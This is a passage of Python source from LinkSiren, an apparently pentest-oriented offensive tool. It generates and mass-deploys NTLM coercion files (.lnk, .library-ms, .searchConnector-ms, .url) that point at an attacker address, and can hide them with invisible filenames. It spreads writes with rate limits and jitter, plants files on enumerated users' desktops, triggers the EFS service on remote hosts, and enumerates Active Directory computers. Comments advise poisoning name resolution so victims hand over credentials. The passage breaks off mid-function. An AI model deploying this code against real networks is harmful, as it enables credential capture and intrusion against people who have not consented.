"""
This module contains handlers for various modes of operation in the LinkSiren application.
Functions:
    handle_generate(args):
        Generates a payload file based on the provided arguments and writes it to the local
        filesystem.
    handle_rank(args, domain, username, password):
        Reads target data, computes rankings based on the provided arguments, and writes the
        rankings to a file.
    handle_identify(args, domain, username, password):
        Identifies and filters targets based on rankings and writes the filtered targets to a file.
    handle_deploy(args, domain, username, password):
        Deploys the generated payload to the specified targets and logs the paths where the payload
        was written.
    handle_cleanup(args, domain, username, password):
        Cleans up the deployed payloads from the specified targets.
"""

import json
import logging
from datetime import datetime
from pathlib import Path
import sys
from linksiren.impure_functions import (
    read_targets,
    get_sorted_rankings,
    write_payload_local,
    write_list_to_file,
    get_lnk_template,
)
from linksiren.pure_functions import (
    filter_targets,
    is_valid_payload_name,
    create_lnk_payload,
    compute_threshold_date,
    make_invisible_payload_name,
    make_invisible_payload_contents,
    info_print,
)


def handle_generate(args):
    """
    Handles the generation of payload files based on the provided arguments.
    Args:
        args: An object containing the following attributes:
            - payload (str): The name of the payload file to be generated.
            - attacker (str): The attacker's IP address to be included in the payload.
    The function performs the following steps:
    1. Checks if the payload name has a valid extension.
    2. Determines the template path based on the payload extension.
    3. Reads the appropriate template file and formats it with the attacker's IP address.
    4. Writes the formatted payload contents to the specified payload file.
    Supported payload extensions:
    - .searchConnector-ms
    - .library-ms
    - .url
    - .lnk
    If the payload extension is '.lnk', a special handling is performed using `get_lnk_template`
    and `create_lnk_payload`.
    """
    available_extensions = [".searchConnector-ms", ".library-ms", ".url", ".lnk"]
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = Path(__file__).parent / f"template{payload_extension}"
    invisible = getattr(args, "invisible", False)

    if payload_extension == ".lnk":
        lnk_template = get_lnk_template(template_path)
        payload_contents = create_lnk_payload(args.attacker, lnk_template)
        if invisible:
            # Filename gets the SOH prefix; icon-blanking for .lnk is not
            # supported (would require binary template surgery).
            logging.getLogger("main_logger").warning(
                "--invisible only blanks the filename for .lnk payloads; "
                "icon blanking is unsupported for binary lnk templates.",
                extra={"path": args.payload},
            )
    else:
        with open(template_path, "r", encoding="utf-8") as template_file:
            payload_contents = template_file.read()
            payload_contents = payload_contents.format(attacker_ip=args.attacker)
        if invisible:
            payload_contents = make_invisible_payload_contents(
                payload_contents, payload_extension
            )

    payload_name = (
        make_invisible_payload_name(args.payload) if invisible else args.payload
    )
    write_payload_local(payload_name, payload_contents)


def handle_rank(args, credentials, log_queue):
    """
    Handles the ranking process for the given domain using the provided credentials and arguments.
    Args:
        args (Namespace): A namespace object containing the following attributes:
            - active_threshold (int): The threshold for active links.
            - targets (str): The path to the targets file.
            - max_depth (int): The maximum depth for ranking.
            - fast (bool): A flag indicating whether to use the fast mode.
        domain (str): The domain to be ranked.
        username (str): The username for authentication.
        password (str): The password for authentication.
    Returns:
        None
    Side Effects:
        Writes the sorted rankings to a file named 'folder_rankings.txt' in JSON format.
    """
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(
        targets=targets,
        credentials=credentials,
        active_threshold_date=threshold_date,
        max_depth=args.max_depth,
        go_fast=args.fast,
        log_queue=log_queue,
        max_concurrency=args.max_concurrency,
        ignore_folders=args.ignore_shares,
    )

    with open("folder_rankings.txt", mode="w", encoding="utf-8") as f:
        f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))


def handle_identify(args, credentials, log_queue):
    """
    Handles the identification process based on the provided arguments and credentials.

    Args:
        args (Namespace): A namespace object containing the following attributes:
            - active_threshold (int): The threshold in days to consider a target as active.
            - targets (str): The path to the file containing the list of targets.
            - max_depth (int): The maximum depth to search for targets.
            - fast (bool): A flag indicating whether to perform a faster, less thorough search.
            - max_folders_per_target (int): The maximum number of folders to consider per target.
        domain (str): The domain to authenticate against.
        username (str): The username for authentication.
        password (str): The password for authentication.

    Returns:
        None
    """
    threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
    targets = read_targets(args.targets)
    sorted_rankings = get_sorted_rankings(
        targets=targets,
        credentials=credentials,
        active_threshold_date=threshold_date,
        max_depth=args.max_depth,
        go_fast=args.fast,
        log_queue=log_queue,
        max_concurrency=args.max_concurrency,
        ignore_folders=args.ignore_shares,
    )
    filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
    write_list_to_file(filtered_targets, "payload_targets.txt")
    if getattr(args, "json_output", False):
        print(
            json.dumps(
                {
                    "mode": "identify",
                    "input_targets": len(targets),
                    "payload_targets_count": len(filtered_targets),
                    "payload_targets": filtered_targets,
                }
            )
        )


def handle_deploy(args, credentials):
    """
    Handles the deployment of payloads to specified targets.
    Args:
        args (Namespace): Command-line arguments containing the payload name, attacker IP,
                          and targets.
        domain (str): The domain to use for connecting to targets.
        username (str): The username to use for connecting to targets.
        password (str): The password to use for connecting to targets.
    Returns:
        None
    """
    targets = read_targets(args.targets)
    payloads_written = []
    available_extensions = [".searchConnector-ms", ".library-ms", ".url", ".lnk"]
    if not is_valid_payload_name(args.payload, available_extensions):
        return

    payload_extension = Path(args.payload).suffix
    template_path = _resolve_template_path(args, payload_extension)
    invisible = getattr(args, "invisible", False)
    randomize_suffix = getattr(args, "randomize_suffix", False)

    # Intranet-zone preflight: HTTP/WebDAV credential auto-offer only fires
    # when the attacker URL is in the Intranet zone. Bare hostnames are
    # Intranet by default; IPs and FQDNs are Internet zone unless the
    # victim has explicit ZoneMap entries.
    if not _looks_intranet_zoned(args.attacker):
        logging.getLogger("main_logger").warning(
            "attacker target %r is not Intranet-zoned by default. Coercion "
            "will reach the listener but Windows will not auto-offer "
            "credentials. Use a bare hostname (no dots), poison name "
            "resolution, or pre-stage ZoneMap entries on the victim.",
            args.attacker, extra={"path": None},
        )
        print(
            f"WARNING: attacker target {args.attacker!r} is not Intranet-zoned "
            "by default; coercion will fire but no credentials will be sent.",
            file=sys.stderr,
        )

    # Build the payload once if --randomize-suffix is off; otherwise build
    # per-target inside the loop so every write is cache-distinct.
    if not randomize_suffix:
        payload_name, payload_contents = _build_payload_for_target(
            args, payload_extension, template_path, invisible, suffix=None,
        )
    else:
        payload_name = None
        payload_contents = None
    force = getattr(args, "force", False)
    encrypt = getattr(args, "encrypt", False)
    encrypt_keep = getattr(args, "encrypt_keep", False)
    encrypt_target = getattr(args, "encrypt_target", "payload")
    probe_delete = getattr(args, "probe_delete", False)
    encrypt_hosts = set()
    efs_was_stopped = set()

    # PR 6: --exclude / --exclude-defaults-off / --dry-run / --resume /
    # --rate-limit / --jitter-ms
    from linksiren.pure_functions import path_matches_exclude, DEFAULT_EXCLUDE_PATTERNS
    exclude_patterns = list(getattr(args, "exclude", []) or [])
    if not getattr(args, "exclude_defaults_off", False):
        exclude_patterns = list(DEFAULT_EXCLUDE_PATTERNS) + exclude_patterns
    dry_run = getattr(args, "dry_run", False)
    resume = getattr(args, "resume", False)
    rate_limit = float(getattr(args, "rate_limit", 0.0) or 0.0)
    min_interval = (1.0 / rate_limit) if rate_limit > 0 else 0.0
    jitter_raw = getattr(args, "jitter_ms", "") or ""
    jitter_lo = jitter_hi = 0
    if jitter_raw:
        try:
            lo_s, hi_s = jitter_raw.split(",", 1)
            jitter_lo, jitter_hi = int(lo_s), int(hi_s)
            if jitter_lo < 0 or jitter_hi < jitter_lo:
                raise ValueError("MIN must be >= 0 and <= MAX")
        except Exception as e:
            print(f"error: --jitter-ms expects MIN,MAX milliseconds; got {jitter_raw!r} ({e})", file=sys.stderr)
            sys.exit(2)

    # --resume: read payloads_written.txt and skip target *folders* already done.
    already_done = set()
    if resume:
        try:
            with open("payloads_written.txt", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.rsplit("\\", 1)
                    if len(parts) == 2:
                        already_done.add(parts[0])
        except FileNotFoundError:
            pass

    # Apply --exclude before any SMB activity.
    if exclude_patterns:
        for target in targets:
            target.paths = [p for p in target.paths if not path_matches_exclude(p, exclude_patterns)]

    # --dry-run: print the planned writes and bail.
    if dry_run:
        planned = []
        for target in targets:
            for path in target.paths:
                planned.append(f"\\\\{target.host}\\{path}\\{payload_name}")
        print(f"DRY RUN. Would write {len(planned)} payload(s):")
        for p in planned:
            print(f"  {p}")
        return

    import time, random
    last_write = 0.0
    for target in targets:
        target.connect(credentials)
        if encrypt and target.connection is not None:
            from linksiren.target import _efs_service_is_running
            initial = _efs_service_is_running(target.connection)
            if initial is False:
                efs_was_stopped.add(target.host)
        for path in target.paths:
            folder_unc = f"\\\\{target.host}\\{path}"
            if resume and folder_unc in already_done:
                logging.getLogger("main_logger").info(
                    "deploy --resume: skipping target already in payloads_written.txt",
                    extra={"path": folder_unc},
                )
                continue
            if min_interval > 0:
                elapsed = time.monotonic() - last_write
                wait = min_interval - elapsed
                if wait > 0:
                    time.sleep(wait)
            if jitter_hi > 0:
                time.sleep(random.uniform(jitter_lo, jitter_hi) / 1000.0)
            if randomize_suffix:
                from linksiren.pure_functions import make_random_suffix
                suffix = make_random_suffix(4)
                this_name, this_contents = _build_payload_for_target(
                    args, payload_extension, template_path, invisible, suffix=suffix,
                )
            else:
                this_name, this_contents = payload_name, payload_contents
            new_payload_path = target.write_payload(
                path=path,
                payload_name=this_name,
                payload=this_contents,
                force=force,
                encrypt=encrypt,
                encrypt_keep=encrypt_keep,
                encrypt_target=encrypt_target,
                probe_delete=probe_delete,
            )
            last_write = time.monotonic()
            if new_payload_path is not None:
                payloads_written.append(new_payload_path)
                if encrypt:
                    encrypt_hosts.add(target.host)

    write_list_to_file(payloads_written, "payloads_written.txt", "w")
    # Sidecar tracking: which hosts likely have an EFS service started by
    # the --encrypt trigger. Cleanup uses this to WARN that the EFS service
    # is probably still Running on those hosts even after the payload is
    # deleted — a real artifact left by the engagement.
    if encrypt_hosts:
        write_list_to_file(
            sorted(encrypt_hosts), "encrypt_triggered_hosts.txt", "w"
        )
    # Second sidecar: hosts where EFS was *confirmed Stopped* before our
    # deploy. cleanup --stop-efs only stops EFS on this strict subset so we
    # never turn off a service that was legitimately running for non-engagement
    # reasons.
    if efs_was_stopped:
        write_list_to_file(
            sorted(efs_was_stopped), "efs_started_by_us.txt", "w"
        )
    if getattr(args, "json_output", False):
        print(
            json.dumps(
                {
                    "mode": "deploy",
                    "payload": args.payload,
                    "attacker": args.attacker,
                    "payloads_attempted": sum(len(t.paths) for t in targets),
                    "payloads_written": payloads_written,
                    "encrypt_hosts": sorted(encrypt_hosts),
                    "efs_started_by_us": sorted(efs_was_stopped),
                }
            )
        )


def handle_coerce(args, credentials):
    """Trigger the EFS service on each target host without dropping payloads.

    Reuses the existing-file-encryption trick: probe EFS state, wake it via
    a brief throwaway encrypted-file if needed, EFSR-encrypt and decrypt the
    smallest existing file in each target folder. Records hosts that were
    initially-Stopped into ``efs_started_by_us.txt`` so a later
    ``cleanup --stop-efs`` can revert them cleanly.
    """
    targets = read_targets(args.targets)
    triggered_hosts = set()
    efs_was_stopped = set()
    logger = logging.getLogger("main_logger")

    from linksiren.target import (
        _efs_service_is_running,
        _efsr_encrypt_remote,
        _efsr_decrypt_remote,
    )

    for target in targets:
        target.connect(credentials)
        if target.connection is None:
            continue
        initial = _efs_service_is_running(target.connection)
        if initial is False:
            efs_was_stopped.add(target.host)
        for path in target.paths:
            share = path.split("\\")[0]
            folder = "\\".join(path.split("\\")[1:])
            smallest_rel = target._find_smallest_existing_file(share, folder)
            if smallest_rel is None:
                logger.warning(
                    "coerce: no non-empty existing file in target folder; "
                    "cannot place EFS trigger here.",
                    extra={"path": f"\\\\{target.host}\\{share}\\{folder}"},
                )
                continue
            smallest_unc = f"\\\\{target.host}\\{share}\\{smallest_rel}"
            if initial is not True:
                target._wake_efs_via_throwaway(share, folder)
            try:
                _efsr_encrypt_remote(target.connection, smallest_unc, logger=logger)
                logger.info(
                    "coerce: encrypted existing file to trigger EFS.",
                    extra={"path": smallest_unc},
                )
                try:
                    _efsr_decrypt_remote(
                        target.connection, smallest_unc, logger=logger
                    )
                    logger.info(
                        "coerce: reverted encryption on existing file.",
                        extra={"path": smallest_unc},
                    )
                except Exception as e:
                    logger.warning(
                        "coerce: encryption succeeded but revert failed; "
                        "existing file remains EFS-encrypted on disk.",
                        extra={"path": smallest_unc, "exception": str(e)},
                    )
                triggered_hosts.add(target.host)
            except Exception as e:
                logger.warning(
                    "coerce: EfsRpcEncryptFileSrv failed on the chosen "
                    "existing file; EFS may not be reachable.",
                    extra={"path": smallest_unc, "exception": str(e)},
                )

    if triggered_hosts:
        write_list_to_file(
            sorted(triggered_hosts), "encrypt_triggered_hosts.txt", "w"
        )
    if efs_was_stopped:
        write_list_to_file(
            sorted(efs_was_stopped), "efs_started_by_us.txt", "w"
        )
    print(
        f"coerce: triggered EFS on {len(triggered_hosts)} host(s); "
        f"{len(efs_was_stopped)} were initially Stopped (eligible for "
        "cleanup --stop-efs revert).",
        file=sys.stderr,
    )


def _resolve_template_path(args, payload_extension: str):
    """Tester-supplied ``--template`` or the built-in for this extension."""
    user_template = getattr(args, "template", None)
    if user_template:
        from pathlib import Path as _P
        p = _P(user_template)
        if not p.exists():
            print(f"error: --template {user_template!r} not found", file=sys.stderr)
            sys.exit(2)
        if p.suffix != payload_extension:
            print(
                f"error: --template extension {p.suffix!r} does not match "
                f"payload extension {payload_extension!r}",
                file=sys.stderr,
            )
            sys.exit(2)
        return p
    return Path(__file__).parent / f"template{payload_extension}"


def _looks_intranet_zoned(host: str) -> bool:
    """Best-effort: True when ``host`` is a bare hostname (no dots, not IP)."""
    import ipaddress
    if not host:
        return False
    try:
        ipaddress.ip_address(host)
        return False
    except ValueError:
        pass
    return "." not in host


def _build_payload_for_target(
    args, payload_extension: str, template_path, invisible: bool, suffix=None,
):
    """Build (payload_name, payload_contents) for a single target."""
    from linksiren.pure_functions import (
        apply_suffix_to_payload_name,
        apply_suffix_to_payload_url_path,
    )

    if payload_extension == ".lnk":
        lnk_template = get_lnk_template(template_path)
        contents = create_lnk_payload(args.attacker, lnk_template)
        if invisible:
            logging.getLogger("main_logger").warning(
                "--invisible only blanks the filename for .lnk payloads; "
                "icon blanking is unsupported for binary lnk templates.",
                extra={"path": args.payload},
            )
    else:
        with open(template_path, "r", encoding="utf-8") as f:
            template_contents = f.read()
            contents = template_contents.format(attacker_ip=args.attacker)
        if invisible:
            contents = make_invisible_payload_contents(contents, payload_extension)

    name = make_invisible_payload_name(args.payload) if invisible else args.payload
    if suffix:
        name = apply_suffix_to_payload_name(name, suffix)
        contents = apply_suffix_to_payload_url_path(contents, payload_extension, suffix)
    return name, contents


def handle_target_sessions(args, credentials):
    """Per-host: enumerate real users under C$\\Users, regex-filter, and
    drop the payload in each matching user's Desktop. Optionally drop in
    Users\\Public\\Desktop. Delegates to handle_deploy so every deploy
    flag behaves identically.
    """
    import re
    from linksiren.target import _enumerate_user_desktops, HostTarget

    logger = logging.getLogger("main_logger")

    pattern_strings = [args.users]
    if getattr(args, "users_file", None):
        try:
            with open(args.users_file, encoding="utf-8") as f:
                for ln in f:
                    ln = ln.strip()
                    if ln and not ln.startswith("#"):
                        pattern_strings.append(ln)
        except FileNotFoundError:
            print(f"error: --users-file {args.users_file!r} not found", file=sys.stderr)
            sys.exit(2)
    try:
        patterns = [re.compile(p, re.IGNORECASE) for p in pattern_strings]
    except re.error as e:
        print(f"error: bad regex in --users / --users-file: {e}", file=sys.stderr)
        sys.exit(2)

    hosts = read_targets(args.targets)
    expanded = []
    per_host_users = {}
    for ht in hosts:
        ht.connect(credentials)
        if ht.connection is None:
            logger.warning(
                "target-sessions: could not connect to host; skipping.",
                extra={"path": f"\\\\{ht.host}"},
            )
            continue
        desktop_paths = _enumerate_user_desktops(
            ht.connection, patterns,
            include_public=getattr(args, "public_desktop", False), logger=logger,
        )
        if not desktop_paths:
            logger.info(
                "target-sessions: no matching user desktops on host.",
                extra={"path": f"\\\\{ht.host}"},
            )
            continue
        expanded.append(HostTarget(host=ht.host, paths=[f"C$\\{p}" for p in desktop_paths]))
        per_host_users[ht.host] = [
            p.split("\\")[1] for p in desktop_paths if not p.endswith("Public\\Desktop")
        ]

    if not expanded:
        print(
            "target-sessions: no matching user desktops found on any host "
            "(check --users regex and that the calling account has C$ access).",
            file=sys.stderr,
        )
        return

    if getattr(args, "json_output", False):
        print(json.dumps({
            "mode": "target-sessions",
            "host_count": len(expanded),
            "desktop_count": sum(len(t.paths) for t in expanded),
            "users_by_host": per_host_users,
        }))

    import tempfile
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".target-sessions.txt", delete=False, encoding="utf-8",
    ) as f:
        for t in expanded:
            for p in t.paths:
                f.write(f"\\\\{t.host}\\{p}\n")
        args.targets = f.name
    handle_deploy(args, credentials)
    logger.info(
        f"target-sessions: wrote to {sum(len(t.paths) for t in expanded)} "
        f"desktop(s) across {len(expanded)} host(s).",
        extra={"path": None},
    )


def handle_discover(args, credentials):
    """Enumerate computer objects from AD via LDAP; emit a targets file.

    Output one ``\\\\<dnsHostName>`` UNC per line (or bare hostnames with
    ``--hostname-only``). Disabled accounts are always filtered out;
    ``--inactive-days N`` drops machines whose ``lastLogonTimestamp`` is
    older than N days.
    """
    from impacket.ldap import ldap, ldapasn1

    dc_ip = getattr(args, "dc_ip", None) or credentials.domain
    if not dc_ip:
        print("error: --dc-ip is required (no domain inferred from credentials).", file=sys.stderr)
        sys.exit(2)

    logger = logging.getLogger("main_logger")
    if credentials.use_kerberos:
        import ipaddress, socket
        try:
            ipaddress.ip_address(dc_ip)
            try:
                primary, aliases, _ = socket.gethostbyaddr(dc_ip)
                candidates = [n for n in [primary] + list(aliases) if "." in n]
                if candidates:
                    dc_ip = candidates[0]
                    logger.info("discover: -k with IP-form -dc-ip; resolved to %s for the ldap SPN.", dc_ip, extra={"path": None})
            except (socket.herror, socket.gaierror) as e:
                logger.warning("discover: -k with IP -dc-ip and reverse DNS failed (%s).", e, extra={"path": None})
        except ValueError:
            pass

    base_dn = getattr(args, "base_dn", None)
    if not base_dn:
        if not credentials.domain or "." not in credentials.domain:
            print("error: --base-dn required when credentials domain is not an FQDN.", file=sys.stderr)
            sys.exit(2)
        base_dn = ",".join(f"DC={p}" for p in credentials.domain.split("."))

    use_ldaps = getattr(args, "ldaps", False)
    target = f"{'ldaps' if use_ldaps else 'ldap'}://{dc_ip}"
    conn = ldap.LDAPConnection(target, base_dn, dc_ip)
    if credentials.use_kerberos:
        conn.kerberosLogin(
            credentials.username, credentials.password, credentials.domain,
            getattr(credentials, "lmhash", ""), getattr(credentials, "nthash", ""),
            getattr(credentials, "aes_key", ""),
            kdcHost=getattr(credentials, "kdc_host", None), useCache=True,
        )
    else:
        conn.login(
            credentials.username, credentials.password, credentials.domain,
            getattr(credentials, "lmhash", ""), getattr(credentials, "nthash", ""),
        )

    search_filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    attrs = ["dNSHostName", "sAMAccountName", "operatingSystem", "lastLogonTimestamp"]
    raw = conn.search(searchFilter=search_filter, attributes=attrs, sizeLimit=0)

    inactive_days = int(getattr(args, "inactive_days", 0) or 0)
    cutoff_filetime = 0
    if inactive_days > 0:
        import time
        seconds_cutoff = time.time() - (inactive_days * 86400)
        cutoff_filetime = int((seconds_cutoff + 11644473600) * 10_000_000)

    hosts = []
    for entry in raw:
        if not isinstance(entry, ldapasn1.SearchResultEntry):
            continue
        host = sam = os_ = None
        last_logon = 0
        for attr in entry["attributes"]:
            name = str(attr["type"])
            vals = [str(v) for v in attr["vals"]]
            if not vals:
                continue
            if name == "dNSHostName":
                host = vals[0]
            elif name == "sAMAccountName":
                sam = vals[0]
            elif name == "operatingSystem":
                os_ = vals[0]
            elif name == "lastLogonTimestamp":
                try:
                    last_logon = int(vals[0])
                except ValueError:
                    pass
        if not host and sam and sam.endswith("$") and credentials.domain:
            host = sam[:-1] + "." + credentials.domain.lower()
        if not host:
            continue
        if cutoff_filetime and last_logon and last_logon < cutoff_filetime:
            continue
        hosts.append({"host": host, "os": os_ or "", "last_logon_filetime": last_logon})

    hostname_only = getattr(args, "hostname_only", False)
    out_path = getattr(args, "output", None)
    out_lines = [h["host"] if hostname_only else f"\\\\{h['host']}" for h in hosts]

    if getattr(args, "json_output", False):
        print(json.dumps({
            "mode": "discover", "base_dn": base_dn, "dc": dc_ip,
            "computer_count": len(hosts), "computers": hosts,
        }))
    else:
        for line in out_lines:
            print(line)
        print(f"# {len(out_lines)} computer(s) discovered", file=sys.stderr)

    if out_path:
        with open(out_path, "w", encoding="utf-8") as f:
            for line in out_lines:
                f.write(line + "\n")
        print(f"# wrote {out_path}", file=sys.stderr)


def _fmt_running(v):
    """Compact 3-way running indicator."""
    return {True: "running", False: "stopped", None: "unknown"}[v]


def handle_check(args, credentials):
    """Per-host preflight: auth, shares, service states, signing.

    Reports what each target host accepts, what shares are listable,
    EFS / WebClient service state, SMB signing-required flag, and
    fragile-infrastructure-pattern flags on host / share names.
    """
    targets = read_targets(args.targets)
    logger = logging.getLogger("main_logger")
    from linksiren.target import _efs_service_is_running, _webclient_service_is_running

    FRAGILE_PATTERNS = (
        "scada", "ics", "plc", "rtu", "hmi", "dcs", "historian", "-ot", "ot-",
        "medical", "biomed", "clinical", "ehr", "emr", "pacs", "hl7",
        "infusion", "ventilator", "imaging", "lab-", "-lab",
        "safety", "protect-", "relay-", "substation", "turbine",
    )

    def flag_fragile(name: str) -> str:
        low = name.lower()
        hits = [p for p in FRAGILE_PATTERNS if p in low]
        return ",".join(hits) if hits else ""

    report = []
    for target in targets:
        h = {
            "host": target.host,
            "auth": "unreached",
            "smb_signing_required": None,
            "shares": [],
            "efs_running": None,
            "webclient_running": None,
            "fragile_hostname_flags": flag_fragile(target.host),
        }
        target.connect(credentials)
        if target.connection is None:
            h["auth"] = "failed"
            report.append(h)
            continue
        h["auth"] = "ok"
        try:
            h["smb_signing_required"] = bool(target.connection.isSigningRequired())
        except Exception:
            pass
        h["efs_running"] = _efs_service_is_running(target.connection)
        h["webclient_running"] = _webclient_service_is_running(target.connection)
        try:
            from impacket.dcerpc.v5.srvs import STYPE_DISKTREE, STYPE_MASK
            for s in target.connection.listShares():
                if s["shi1_type"] & STYPE_MASK == STYPE_DISKTREE:
                    name = s["shi1_netname"][:-1]
                    h["shares"].append({"name": name, "fragile": flag_fragile(name)})
        except Exception as e:
            logger.warning(
                "check: could not enumerate shares",
                extra={"path": f"\\\\{target.host}", "exception": str(e)},
            )
        report.append(h)

    for h in report:
        if h["auth"] != "ok":
            continue
        wc = h["webclient_running"]
        ready_wc = (
            "yes (WebClient running)" if wc is True
            else "yes (WebClient stopped; triggered-start expected)" if wc is False
            else "unknown"
        )
        h["payload_viability"] = {
            ".url": {"auto_trigger": False, "needs_intranet_zone": True,
                     "ready_now": "n/a (needs user open + intranet zone)"},
            ".searchConnector-ms": {"auto_trigger": True, "needs_intranet_zone": True, "ready_now": ready_wc},
            ".library-ms": {"auto_trigger": True, "needs_intranet_zone": True, "ready_now": ready_wc},
            ".lnk": {"auto_trigger": True, "needs_intranet_zone": True,
                     "ready_now": (
                         "yes via WebDAV (WebClient running)" if wc is True
                         else "yes (WebClient stopped; WebDAV-first or SMB fall-through)" if wc is False
                         else "unknown"
                     )},
        }

    if getattr(args, "json_output", False):
        print(json.dumps({"mode": "check", "hosts": report}))
        return
    for h in report:
        print(f"\n=== {h['host']} ===")
        print(f"  auth: {h['auth']}")
        if h["auth"] != "ok":
            continue
        print(f"  SMB signing required: {h['smb_signing_required']}"
              f"   EFS: {_fmt_running(h['efs_running'])}"
              f"   WebClient: {_fmt_running(h['webclient_running'])}")
        if h["fragile_hostname_flags"]:
            print(f"  fragile-infra hostname pattern: {h['fragile_hostname_flags']}")
        print(f"  shares ({len(h['shares'])}):")
        for s in h["shares"]:
            tag = f"  fragile-infra: {s['fragile']}" if s["fragile"] else ""
            print(f"    {s['name']}{tag}")
        print(f"  payload viability:")
        for ext, viab in h["payload_viability"].items():
            trig = "parent-folder open" if viab["auto_trigger"] else "user open"
            print(f"    {ext:<22} trigger={trig:<19} intranet-zone-needed={viab['needs_intranet_zone']}")
            print(f"    {'':<22}   ready: {viab['ready_now']}")
    print()


def handle_cleanup(args, credentials):
    """
    Handles the cleanup process by connecting to each target and deleting specified payloads.

    Args:
        args (Namespace): A namespace object containing the following attributes:
            - targets (str): Path to the file containing the list of targets.
            - payload (str): The payload to be deleted from each target.
        domain (str): The domain to use for connecting to the targets.
        username (str): The username to use for connecting to the targets.
        password (str): The password to use for connecting to the targets.

    Returns:
        None
    """
    payloads_not_deleted = []
    targets = read_targets(args.targets)
    # Read the "EFS was stopped before deploy" sidecar — strict subset of
    # hosts where --stop-efs is allowed to stop the service.
    stop_efs = getattr(args, "stop_efs", False)
    try:
        with open("efs_started_by_us.txt", encoding="utf-8") as f:
            efs_started_by_us = {line.strip() for line in f if line.strip()}
    except FileNotFoundError:
        efs_started_by_us = set()
    stopped_hosts = []
    refused_hosts = []
    stop_webclient = getattr(args, "stop_webclient", False)
    webclient_stopped = []
    for target in targets:
        target.connect(credentials)
        # Use ``extend`` so failures from earlier hosts aren't dropped on the
        # floor when iterating multiple targets.
        payloads_not_deleted.extend(target.delete_payloads())
        # Stop EFS only if (a) pentester opted in, (b) we recorded this host
        # as initially-stopped before our deploy, AND (c) EFS is currently
        # running. The (c) check avoids spurious stop attempts and is the
        # honest interpretation of "only stop what we started".
        if stop_efs and target.host in efs_started_by_us:
            from linksiren.target import (
                _efs_service_is_running,
                _efs_service_stop,
            )
            if _efs_service_is_running(target.connection) is True:
                if _efs_service_stop(target.connection, logger=logging.getLogger("main_logger")):
                    stopped_hosts.append(target.host)
                else:
                    refused_hosts.append(target.host)
        # Stop WebClient: unlike EFS, the service accepts SCMR STOP under
        # normal Windows configuration. Always safe to attempt; a refusal
        # typically means a legitimate user holds an active WebDAV handle.
        if stop_webclient and target.connection is not None:
            from linksiren.target import (
                _webclient_service_is_running,
                _webclient_service_stop,
            )
            wc_state = _webclient_service_is_running(target.connection)
            if wc_state is True:
                if _webclient_service_stop(target.connection, logger=logging.getLogger("main_logger")):
                    webclient_stopped.append(target.host)

    write_list_to_file(payloads_not_deleted, "payloads_not_deleted.txt", "w")

    # If the prior deploy tracked --encrypt-triggered hosts, warn that the
    # EFS service is likely still Running on them — deleting the payload
    # does not stop the service. The pentester can verify with:
    #   Get-Service EFS  (PowerShell on the target)
    try:
        with open("encrypt_triggered_hosts.txt", encoding="utf-8") as f:
            triggered = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        triggered = []
    main_log = logging.getLogger("main_logger")
    if stop_efs:
        if stopped_hosts:
            msg = (
                f"Stopped EFS service via SCMR on {len(stopped_hosts)} "
                f"host(s): {', '.join(stopped_hosts)}. These hosts had EFS "
                "Stopped before our deploy; the service was woken by our "
                "--encrypt trigger and is now restored to the original state."
            )
            main_log.info(msg, extra={"path": None})
            print(msg, file=sys.stderr)
        if refused_hosts:
            msg = (
                f"--stop-efs requested but SCMR stop FAILED on "
                f"{len(refused_hosts)} host(s): {', '.join(refused_hosts)}. "
                "Common cause: the calling account lacks privilege to stop "
                "services. EFS service is still RUNNING on these hosts."
            )
            main_log.warning(msg, extra={"path": None})
            print(msg, file=sys.stderr)
        # Hosts that had EFS already-running pre-deploy are deliberately
        # left alone — they didn't change state because of us.
        already_running = sorted(set(triggered) - efs_started_by_us)
        if already_running:
            msg = (
                "--stop-efs left EFS untouched on "
                f"{len(already_running)} host(s) that had EFS already "
                "Running before deploy (not our state to revert): "
                + ", ".join(already_running)
            )
            main_log.info(msg, extra={"path": None})
            print(msg, file=sys.stderr)
    elif triggered:
        msg = (
            "EFS service is likely still RUNNING on "
            f"{len(triggered)} host(s) that received an --encrypt payload "
            "during deploy: "
            + ", ".join(triggered)
            + ". Cleanup removed the file(s) but did not stop the service. "
            "Use cleanup --stop-efs to stop it automatically (only acts on "
            "hosts where EFS was confirmed Stopped before deploy), or "
            "verify with `Get-Service EFS` and stop out-of-band."
        )
        main_log.warning(msg, extra={"path": None})
        print(msg, file=sys.stderr)

    if stop_webclient and webclient_stopped:
        msg = (
            f"Stopped WebClient service via SCMR on {len(webclient_stopped)} "
            f"host(s): {', '.join(webclient_stopped)}."
        )
        main_log.info(msg, extra={"path": None})
        print(msg, file=sys.stderr)

    if len(payloads_not_deleted) == 0:
        print("All payloads deleted successfully.")
    else:
        print(
            "Some payloads could not be deleted. See 'payloads_not_deleted.txt' "
            "and CRITICAL level events in linksiren.log for details.",
            file=sys.stderr,
        )
def handle_report(args):
    """Engagement summary report.

    Builds a markdown document covering everything linksiren did in this
    engagement directory: files written, hosts where --encrypt fired,
    hosts where EFS was confirmed-Stopped before our deploy, cleanup
    leftovers, detect findings, and captured coercion auth events.
    """
    from collections import Counter
    from pathlib import Path

    def _read_lines(p):
        try:
            with open(p, encoding="utf-8") as f:
                return [ln.strip() for ln in f if ln.strip()]
        except FileNotFoundError:
            return []

    output_path = args.output
    log_path = args.logfile

    written = _read_lines("payloads_written.txt")
    not_deleted = _read_lines("payloads_not_deleted.txt")
    encrypt_hosts = _read_lines("encrypt_triggered_hosts.txt")
    efs_started_by_us = _read_lines("efs_started_by_us.txt")
    detect_lines = _read_lines("detect_findings.txt")
    capture_lines = _read_lines("coerce_captures.log")

    # Parse the JSON log for high-level events
    events = []
    levels = Counter()
    try:
        with open(log_path, encoding="utf-8") as f:
            for ln in f:
                ln = ln.strip()
                if not ln:
                    continue
                try:
                    ev = json.loads(ln)
                except json.JSONDecodeError:
                    continue
                events.append(ev)
                levels[ev.get("Level", "?")] += 1
    except FileNotFoundError:
        pass

    written_by_host = Counter()
    for line in written:
        if line.startswith("\\\\"):
